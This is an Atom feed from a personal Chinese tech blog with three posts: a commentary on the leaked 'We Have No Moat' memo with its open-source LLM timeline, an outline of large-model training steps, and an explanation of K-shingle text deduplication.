<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://johnyin-hub.github.io/</id>
    <title>JohnYin</title>
    <updated>2023-05-08T00:31:46.246Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://johnyin-hub.github.io/"/>
    <link rel="self" href="https://johnyin-hub.github.io/atom.xml"/>
    <subtitle>看代码、看论文、看乐谱真挺无聊，还是好好看看身边人有意思</subtitle>
    <logo>https://johnyin-hub.github.io/images/avatar.png</logo>
    <icon>https://johnyin-hub.github.io/favicon.ico</icon>
    <rights>All rights reserved 2023, JohnYin</rights>
    <entry>
        <title type="html"><![CDATA[谷歌：“我们没有壁垒，他们也没有”]]></title>
        <id>https://johnyin-hub.github.io/post/gu-ge-wo-men-mei-you-bi-lei-ta-men-ye-mei-you/</id>
        <link href="https://johnyin-hub.github.io/post/gu-ge-wo-men-mei-you-bi-lei-ta-men-ye-mei-you/">
        </link>
        <updated>2023-05-05T19:47:31.000Z</updated>
        <content type="html"><![CDATA[<h1 id="大模型没有壁垒">大模型没有壁垒</h1>
<p>原文：<a href="https://www.semianalysis.com/p/google-we-have-no-moat-and-neither">Google &quot;We Have No Moat, And Neither Does OpenAI&quot;</a></p>
<h2 id="引言">引言</h2>
<p>2023年5月4日一份谷歌内部资料泄露，表达大模型时代谷歌和其他公司都没有技术壁垒。</p>
<p><em>下面的文本是一份最近泄露的文件，由一位匿名人士在公共 Discord 服务器上共享，该服务器已授予其重新发布的许可。它起源于谷歌内部的一名研究员。我们已经验证了它的真实性。唯一的修改是格式化和删除指向内部网页的链接。该文件仅代表谷歌员工的意见，并非整个公司的意见。我们不同意下面写的内容，我们询问的其他研究人员也不同意，但我们将在另一篇文章中发表我们对此的看法，供订阅者使用。我们只是分享这份文件的工具，这份文件提出了一些非常有趣的观点。</em></p>
<p>ChatGPT席卷全球，通用人工智能的曙光正在来临。然而这场人工智能的变革到底将以什么样的形式进行，谁终究能掌握技术的主动权？答案揭晓于现实世界中，这篇文章可以带来技术、商业和市场化的思考。包括我在22年3月以前都只认为这次的变革会受寡头绝对优势的垄断，但很明显技术的发展并不像我想象的那样，我自己也可以微调测试多个大模型了。</p>
<h2 id="complain">Complain</h2>
<p><strong>作者首先认为主流公司没有办法在变革中占到绝对优势，主要的开源问题已经被解决，且技术掌握在大众手里。原文如下：</strong></p>
<p>I’m talking, of course, about open source. Plainly put, they are lapping us. <strong>Things we consider “major open problems” are solved and in people’s hands today.</strong> Just to name a few:</p>
<ul>
<li><strong>LLMs on a Phone:</strong> <a href="https://twitter.com/thiteanish/status/1635678053853536256">People are running foundation models on a Pixel 6</a> at 5 tokens / sec.</li>
<li><strong>Scalable Personal AI:</strong> <a href="https://github.com/tloen/alpaca-lora">You can finetune a personalized AI on your laptop in an evening.</a></li>
<li><strong>Responsible Release:</strong> This one isn’t “solved” so much as “obviated”. <a href="https://civitai.com/">There are entire websites full of art models with no restrictions whatsoever</a>, and text is <a href="https://medium.com/geekculture/list-of-open-sourced-fine-tuned-large-language-models-llm-8d95a2e0dc76">not far behind.</a></li>
<li><strong>Multimodality:</strong> <a href="https://arxiv.org/pdf/2303.16199.pdf">The current multimodal ScienceQA SOTA was trained in an hour</a>.</li>
</ul>
<ol>
<li>大模型在移动设备的运行。</li>
<li>扩展个性化AI，每个人都可以参与微调。</li>
<li>不需要过多承担风险责任问题</li>
<li>大模型多模态问题。</li>
</ol>
<p>然后作者吐槽了斥巨资训练的超大模型在质量上对比开源免费的模型并占不到便宜。目前主流模型效果如下图：</p>
<figure data-type="image" tabindex="1"><img src="https://johnyin.oss-cn-shanghai.aliyuncs.com/uPic/image-20230506030004466.png" alt="image-20230506030004466" loading="lazy"></figure>
<h2 id="reason">Reason</h2>
<p>作者直接了当的指出Meta公司开放的LAMA模型让公众有能力具备大模型基础技术原文：</p>
<p>At the beginning of March the open source community <a href="https://www.vice.com/en/article/xgwqgw/facebooks-powerful-large-language-model-leaks-online-4chan-llama">got their hands on</a> their first really capable foundation model, as Meta’s LLaMA was leaked to the public. It had no instruction or conversation tuning, and no RLHF. Nonetheless, the community immediately understood the significance of what they had been given.</p>
<p>此外作者认识到开源社区创新的能力是他们无法想象的，包括一些指令微调、量化优化、人工评估、RLHF、多模态等。原文：</p>
<p>A tremendous outpouring of innovation followed, with just days between major developments (see The Timeline for the full breakdown). Here we are, barely a month later, and there are variants with <a href="https://crfm.stanford.edu/2023/03/13/alpaca.html">instruction tuning</a>, <a href="https://github.com/ggerganov/llama.cpp">quantization</a>, <a href="https://lmsys.org/blog/2023-03-30-vicuna/">quality improvements</a>, <a href="https://arxiv.org/pdf/2303.16199.pdf">human evals</a>, <a href="https://arxiv.org/pdf/2303.16199.pdf">multimodality</a>, <a href="https://drive.google.com/file/d/10iR5hKwFqAKhL3umx8muOWSRm7hs5FqX/view">RLHF</a>, etc. etc. many of which build on each other.</p>
<h2 id="why">Why</h2>
<p>​		作者拿图像的stable diffusion 的技术变革来类比这次大模型的变得，说的直白一点就是，开源的技术质量太好了，好到做闭源的没有明显优势了。</p>
<p>​		我也认为当开源技术效果好到一定地步的时候，将会滚雪球一样，无数的公司个人会争先的进入这个领域实现他们的想法。这样形成的产品、市场、用户交互的创新将是无法阻挡的。</p>
<h2 id="regret">Regret</h2>
<p>作者直接了当的夸奖了lora的微调技术，表示当初应该更关注lora这类微调技术。原文如下：</p>
<p>The innovations that powered open source’s recent successes directly solve problems we’re still struggling with. Paying more attention to their work could help us to avoid reinventing the wheel.</p>
<h4 id="lora-is-an-incredibly-powerful-technique-we-should-probably-be-paying-more-attention-to">LoRA is an incredibly powerful technique we should probably be paying more attention to</h4>
<p><a href="https://arxiv.org/abs/2106.09685">LoRA </a>works by representing model updates as low-rank factorizations, which reduces the size of the update matrices by a factor of up to several thousand. This allows model fine-tuning at a fraction of the cost and time. Being able to personalize a language model in a few hours on consumer hardware is a big deal, <em>particularly</em> for <a href="http://www.internalgooglesitescrubbedbyus.com/">aspirations that involve incorporating new and diverse knowledge in near real-time</a>. The fact that this technology exists is underexploited inside Google, even though it directly impacts some of our most ambitious projects.</p>
<h2 id="conclusion">Conclusion</h2>
<p>作者总结了很多结论性的东西，有的有冗余，我融合了一些传达清楚意思如下：</p>
<ol>
<li>从头训练一个大模型代价很高，如果小模型上能快速的升级改造且质量直逼大模型，那么大模型的优势几乎就没有。</li>
<li>数据质量比数据大小好。（我作为一个从业人员从来不怀疑这一点，感性的也可以感知大模型的“学话”过程和样本质量有较强的关联性。）</li>
<li>不应该和开源直接竞争，应该建立良好的开源系统。推动创新，控制创新。</li>
<li>个人和大公司开发模型应用承担的责任是不一样的，</li>
</ol>
<h2 id="epilogue">Epilogue</h2>
<p>作者在最后提到了OpenAI，认为openAI和谷歌一样遇到同样的问题，犯了同样的错误，预测OpenAI会被开源打败。</p>
<p>我部分同意上述观点，但OpenAI的广泛的用户测试积累了大量真实数据。即使没有技术全部开源，数据的优势只会更加明显。</p>
<h1 id="the-timeline">The Timeline</h1>
<p>最后作者放了疯狂3月的时间线。</p>
<p>在3月LAMA开放的时候并未意识到变革的到来，Timeline上的项目拉开了这场变革的序幕，我作为后知后觉的韭菜跑步进场希望分得这场变革的一杯羹。技术变革如此之快，快到未来5年的技术世界都不敢想象。我们如何才能在这场变革中抓到技术的主动权？通用人工智能的蓝图到底以何种形式展开？</p>
<p>变革时代，宁可后知后觉，不可不知不觉</p>
<h3 id="feb-24-2023-llama-is-launched">Feb 24, 2023 - LLaMA is Launched</h3>
<p><a href="https://ai.facebook.com/blog/large-language-model-llama-meta-ai/">Meta launches LLaMA</a>, open sourcing the code, but not the weights. At this point, LLaMA is not instruction or conversation tuned. Like many current models, it is a relatively small model (available at 7B, 13B, 33B, and 65B parameters) that has been trained for a relatively large amount of time, and is therefore quite capable relative to its size.</p>
<h3 id="march-3-2023-the-inevitable-happens">March 3, 2023 - The Inevitable Happens</h3>
<p>Within a week, <a href="https://www.vice.com/en/article/xgwqgw/facebooks-powerful-large-language-model-leaks-online-4chan-llama">LLaMA is leaked to the public</a>. The impact on the community cannot be overstated. Existing licenses prevent it from being used for commercial purposes, but suddenly anyone is able to experiment. From this point forward, innovations come hard and fast.</p>
<h3 id="march-12-2023-language-models-on-a-toaster">March 12, 2023 - Language models on a Toaster</h3>
<p>A little over a week later, Artem Andreenko <a href="https://github.com/ggerganov/llama.cpp/issues/58">gets the model working on a Raspberry Pi</a>. At this point the model runs too slowly to be practical because the weights must be paged in and out of memory. Nonetheless, this sets the stage for an onslaught of minification efforts.</p>
<h3 id="march-13-2023-fine-tuning-on-a-laptop">March 13, 2023 - Fine Tuning on a Laptop</h3>
<p>The next day, Stanford releases <a href="https://crfm.stanford.edu/2023/03/13/alpaca.html">Alpaca</a>, which adds instruction tuning to LLaMA. More important than the actual weights, however, was Eric Wang’s <a href="https://github.com/tloen/alpaca-lora">alpaca-lora</a> repo, which used <a href="https://arxiv.org/abs/2106.09685">low rank fine-tuning</a> to do this training “within hours on a single RTX 4090”.</p>
<p>Suddenly, anyone could fine-tune the model to do anything, kicking off a race to the bottom on low-budget fine-tuning projects. Papers proudly describe their total spend of a few hundred dollars. What’s more, the low rank updates can be distributed easily and separately from the original weights, making them independent of the original license from Meta. Anyone can share and apply them.</p>
<h3 id="march-18-2023-now-its-fast">March 18, 2023 - Now It’s Fast</h3>
<p>Georgi Gerganov <a href="https://github.com/ggerganov/llama.cpp">uses 4 bit quantization</a> to run LLaMA on a MacBook CPU. It is the first “no GPU” solution that is fast enough to be practical.</p>
<h3 id="march-19-2023-a-13b-model-achieves-parity-with-bard">March 19, 2023 - A 13B model achieves “parity” with Bard</h3>
<p>The next day, a cross-university collaboration releases <a href="https://lmsys.org/blog/2023-03-30-vicuna/">Vicuna</a>, and uses GPT-4-powered eval to provide qualitative comparisons of model outputs. While the evaluation method is suspect, the model is materially better than earlier variants. <strong>Training Cost: $300.</strong></p>
<p>Notably, they were able to use data from ChatGPT while circumventing restrictions on its API - They simply sampled examples of “impressive” ChatGPT dialogue posted on sites like <a href="https://sharegpt.com/">ShareGPT</a>.</p>
<h3 id="march-25-2023-choose-your-own-model">March 25, 2023 - Choose Your Own Model</h3>
<p>Nomic creates <a href="https://github.com/nomic-ai/gpt4all">GPT4All</a>, which is both a <a href="https://s3.amazonaws.com/static.nomic.ai/gpt4all/2023_GPT4All_Technical_Report.pdf">model </a>and, more importantly, an <a href="https://github.com/nomic-ai/gpt4all#gpt4all-compatibility-ecosystem">ecosystem</a>. For the first time, we see models (including Vicuna) being gathered together in one place. <strong>Training Cost: $100.</strong></p>
<h3 id="march-28-2023-open-source-gpt-3">March 28, 2023 - Open Source GPT-3</h3>
<p>Cerebras (not to be confused with our own Cerebra) trains the GPT-3 architecture using the optimal compute schedule implied by Chinchilla, and the optimal scaling implied by <a href="https://arxiv.org/abs/2203.03466">μ-parameterization</a>. This outperforms existing GPT-3 clones by a wide margin, and represents the first confirmed use of μ-parameterization “in the wild”. These models are trained from scratch, meaning the community is no longer dependent on LLaMA.</p>
<h3 id="march-28-2023-multimodal-training-in-one-hour">March 28, 2023 - Multimodal Training in One Hour</h3>
<p>Using a novel Parameter Efficient Fine Tuning (PEFT) technique, <a href="https://arxiv.org/pdf/2303.16199.pdf">LLaMA-Adapter</a> introduces instruction tuning and multimodality in one hour of training. Impressively, they do so with just 1.2M learnable parameters. The model achieves a new SOTA on multimodal ScienceQA.</p>
<h3 id="april-3-2023-real-humans-cant-tell-the-difference-between-a-13b-open-model-and-chatgpt">April 3, 2023 - Real Humans Can’t Tell the Difference Between a 13B Open Model and ChatGPT</h3>
<p>Berkeley launches <a href="https://bair.berkeley.edu/blog/2023/04/03/koala/">Koala</a>, a dialogue model trained entirely using freely available data.</p>
<p>They take the crucial step of measuring real human preferences between their model and ChatGPT. While ChatGPT still holds a slight edge, more than 50% of the time users either prefer Koala or have no preference. <strong>Training Cost: $100.</strong></p>
<h3 id="april-15-2023-open-source-rlhf-at-chatgpt-levels">April 15, 2023 - Open Source RLHF at ChatGPT Levels</h3>
<p><a href="https://open-assistant.io/">Open Assistant</a> launches <a href="https://drive.google.com/file/d/10iR5hKwFqAKhL3umx8muOWSRm7hs5FqX/view">a model and, more importantly, a dataset</a> for Alignment via RLHF. Their model is close (48.3% vs. 51.7%) to ChatGPT in terms of human preference. In addition to LLaMA, they show that this dataset can be applied to Pythia-12B, giving people the option to use a fully open stack to run the model. Moreover, because the dataset is publicly available, it takes RLHF from unachievable to cheap and easy for small experimenters.</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[如何训练一个大模型？]]></title>
        <id>https://johnyin-hub.github.io/post/ru-he-xun-lian-yi-ge-da-mo-xing/</id>
        <link href="https://johnyin-hub.github.io/post/ru-he-xun-lian-yi-ge-da-mo-xing/">
        </link>
        <updated>2023-05-04T18:21:54.000Z</updated>
        <content type="html"><![CDATA[<p>前提：数据、算力、模型架构（GPT、GLM）</p>
<ol>
<li>单机跑通demo
<ol>
<li>数据格式，怎么mask，tokenizer（BPE、sentencepiece）
<ol>
<li>tokenizer</li>
<li>glm：mask、gmask、smask</li>
<li>位置编码</li>
</ol>
</li>
<li>预训练，ntp，mtp
<ol>
<li>loss</li>
<li>激活函数：gelu</li>
<li>怎么预测，代码实现，高效softmax，glm默认softmax</li>
<li>train
<ol>
<li>稳定训练：norm、embedding gradient shrink
<ol>
<li>deepnorm</li>
<li>embedding gradient shrink</li>
<li>embeddign layernorm</li>
</ol>
</li>
<li>加速训练
<ol>
<li>混合精度训练</li>
<li>gradient checkpoint</li>
</ol>
</li>
</ol>
</li>
<li>loss 监控可视化
<ol>
<li>实验日志管理</li>
</ol>
</li>
</ol>
</li>
<li>推理
<ol>
<li>推理解码：采样、greed search、beam search</li>
<li>量化：零值量化、absmax量化</li>
<li>蒸馏</li>
</ol>
</li>
<li>微调
<ol>
<li>高效参数微调技术：ptuning、lora……</li>
<li>instruct 微调，cot微调</li>
</ol>
</li>
</ol>
</li>
<li>并行大规模
<ol>
<li>3d并行
<ol>
<li>数据</li>
<li>模型</li>
<li>tensor</li>
</ol>
</li>
<li>并行框架</li>
<li>scale lawing</li>
</ol>
</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[文本去重]]></title>
        <id>https://johnyin-hub.github.io/post/wen-ben-qu-chong/</id>
        <link href="https://johnyin-hub.github.io/post/wen-ben-qu-chong/">
        </link>
        <updated>2023-02-10T18:13:04.000Z</updated>
        <content type="html"><![CDATA[<p>原文链接：<a href="https://zhuanlan.zhihu.com/p/43640234">文本去重算法</a></p>
<p>日前接到一个对名言警句这种短文本进行去重的小任务，下图是几个重复文本的示例：</p>
<figure data-type="image" tabindex="1"><img src="https://johnyin.oss-cn-shanghai.aliyuncs.com/uPic/v2-b74f1268f969f31b06c7cce01ebd449c_1440w-20230504162455944-20230504162623535.png" alt="img" loading="lazy"></figure>
<p>很直观的结论就是重复度越高的文本，具有更多重复的词汇。一个最直接的去重思路可以描述为：将文本进行分词处理，统计各文本词汇的重合度。KShingle算法就是基于这样朴素的思想。</p>
<h2 id="一-kshingle算法"><strong>一、KShingle算法</strong></h2>
<p>对于一篇文档而言，K-shingle定义为文档中连续的K个词汇组成的词组，即：</p>
<p>对于一个包含 N 个词汇的文档<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mo>=</mo><mo>[</mo><msub><mi>w</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>w</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>w</mi><mi>N</mi></msub><mo>]</mo></mrow><annotation encoding="application/x-tex">D=[w_{1},w_{2},...,w_{N}]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">N</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>，</p>
<p>指定词组长度 K ，</p>
<p>有 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi><mo>−</mo><mi>s</mi><mi>h</mi><mi>i</mi><mi>n</mi><mi>g</mi><mi>l</mi><mi>i</mi><mi>n</mi><mi>g</mi><mo>=</mo><mrow><mi>n</mi><mo>∈</mo><mo>(</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>N</mi><mo>−</mo><mi>K</mi><mo>+</mo><mn>1</mn><mo>)</mo><mi mathvariant="normal">∣</mi><mo>(</mo><msub><mi>w</mi><mi>n</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>w</mi><mrow><mi>n</mi><mo>+</mo><mi>K</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>)</mo></mrow></mrow><annotation encoding="application/x-tex">K-shingling={n\in(1,2,...,N-K+1) | (w_{n},w_{n+1},...,w_{n+K-1})}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">∣</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight" style="margin-right:0.07153em;">K</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span> 。</p>
<h2 id="一算法步骤">（一）算法步骤</h2>
<p>K-shingle算法通过将文档表示为K-shingle的集合，比较各文档K-shingle集合之间的相似性，来衡量文档的相似度。算法主要步骤如下：</p>
<ol>
<li>
<p>预处理：读取文档数据集，根据需求，对文档中的标点、空白、中英文、简繁体等字符进行清洗和整理。</p>
</li>
<li>
<p>提取K-shingle：对清洗后的文档进行分词处理，指定shingle长度 K ，对每篇文档提取对应的K-shingle集合。</p>
</li>
<li>
<p>统计特征向量：所有文档的K-shingle互异值构成一个大小为 M 的词组库。用one-hot的方式对每篇文档进行编码，得到一个长度为 M 的特征向量，当词组库中的第 m 个K-shingle在文档中出现时，该文档特征向量的第 m 个元素为1，否则为0。</p>
</li>
<li>
<p>计算Jaccard相似度：对于集合 A 和集合 B ，Jaccard相似度定义为交集元素占并集元素的比例大小，即 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mo fence="true">∣</mo><mi>A</mi><mo>∩</mo><mi>B</mi><mo fence="true">∣</mo></mrow><mrow><mo fence="true">∣</mo><mi>A</mi><mo>∪</mo><mi>B</mi><mo fence="true">∣</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\left| A \cap B \right|}{\left| A \cup B \right|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.53em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span><span class="mord mathdefault mtight">A</span><span class="mbin mtight">∪</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span><span class="mord mathdefault mtight">A</span><span class="mbin mtight">∩</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> ，显然比例越大，集合越相似。对两篇文档的特征向量而言，分子指同位元素都为1的元素个数，分母指同位元素至少一个为1的元素个数。</p>
</li>
<li>
<p>文本去重：基于文档相似度的结果，根据预定规则，舍弃重复文本。</p>
</li>
</ol>
<h2 id="二算法分析">（二）算法分析</h2>
<p>关于K-shingle算法的几点分析如下：</p>
<p><strong>1.超参数</strong></p>
<p>算法需要指定的唯一超参数是shingle中包含的连续词汇的个数 K 。该参数主要有两方面的影响：</p>
<p>(1) Shingle对文档语义特征的捕捉能力。</p>
<p>K 越小，K-shingle对文档语义的捕捉能力越差。以英文为例，如果 K=1 ，那么任何一篇文章的K-shingle都是由一个个英文单词构成的集合，因此即便内容完全不相关的文档，它们的Jaccard相似度也可能很高。随着 K 增大，不同词汇的组合能反应出越来越多的语义层面的特征。文本长度越长， K 的取值越大。根据经验，短文本相似度通常取 K=5 ，长文本相似度通常取 K=10 。</p>
<p>(2) Shingle对存储空间和计算效率的影响。</p>
<p>假设任一词汇 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">w_{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的存储空间为 B ，则文档 D 的存储空间为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>N</mi><mo>∗</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">N*B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span> ，<em>K-shingle的存储空间为 (N-K+1)K</em>B ，当 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi><mo>≪</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">K \ll N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≪</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span></span></span></span>时，文档D对应K-shingle的存储空间扩大至 K 倍。</p>
